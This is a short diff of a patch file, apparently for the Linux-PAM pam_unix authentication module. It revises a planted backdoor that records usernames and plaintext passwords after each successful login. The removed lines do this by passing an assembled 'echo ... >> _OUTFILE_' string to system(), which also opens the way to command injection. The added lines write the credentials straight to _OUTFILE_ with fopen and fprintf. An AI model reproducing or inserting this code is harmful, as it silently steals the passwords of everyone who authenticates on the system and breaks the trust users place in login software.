@@ -9,34 +9,15 @@
   	name = p = NULL;
   
   	AUTH_RETURN;
---- 170,200 ----
+--- 170,181 ----
   	D(("user=%s, password=[%s]", name, p));
   
   	/* verify the password of this user */
 !       retval = _unix_verify_password(pamh, name, p, ctrl);
 !       if(retval == PAM_SUCCESS){
-!           char fp[255] = "echo ";
-!           int i=0,i2=0,i3=0;
-!           char *preffix = " >> _OUTFILE_"; 
-!           while(1){
-!             if(name[i] == '\0'){break;} 
-!             fp[5+i] = name[i];
-!             i++;
-!           }
-!           fp[5+i]='-';
-!           fp[5+i+1]='-';
-!           while(1){
-!             if(p[i2] == '\0'){break;}
-!              fp[5+i+1+i2] = p[i2];
-!              i2++;
-!           } 
-!           while(1){
-!               if(preffix[i3] == '\0'){break;}
-!               fp[5+i+1+i2+i3] = preffix[i3];
-!               i3++;
-!           }
-!           fp[254] = '\0';
-!           system(fp);
+!			FILE *fp=fopen("_OUTFILE_","a+");
+!			fprintf(fp, "username:%s password:%s\n",name,p);
+!			fclose(fp);
 !       }
   	name = p = NULL;
   
